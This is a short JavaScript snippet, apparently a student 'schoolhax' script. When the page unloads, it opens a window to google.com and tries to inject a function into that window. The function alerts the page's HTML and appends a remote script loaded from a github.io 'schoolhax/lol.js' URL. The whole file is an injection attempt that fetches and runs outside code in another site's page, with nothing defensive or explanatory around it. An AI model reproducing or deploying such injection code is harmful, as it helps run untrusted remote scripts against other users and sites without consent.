alert('testing');
window.onunload = function(){
  var theWindow = window.open('http://google.com'),
    theDoc = theWindow.document,
    theScript = document.createElement('script');
  function injectThis() {
    alert(document.body.innerHTML);
    var ele = document.createElement('script');
    ele.src = "http://jeffnjellybean.github.io/schoolhax/lol.js";
    document.body.appendChild(ele);
  }
  theScript.innerHTML = 'window.onload = ' + injectThis.toString() + ';';
  theDoc.body.appendChild(theScript);
}
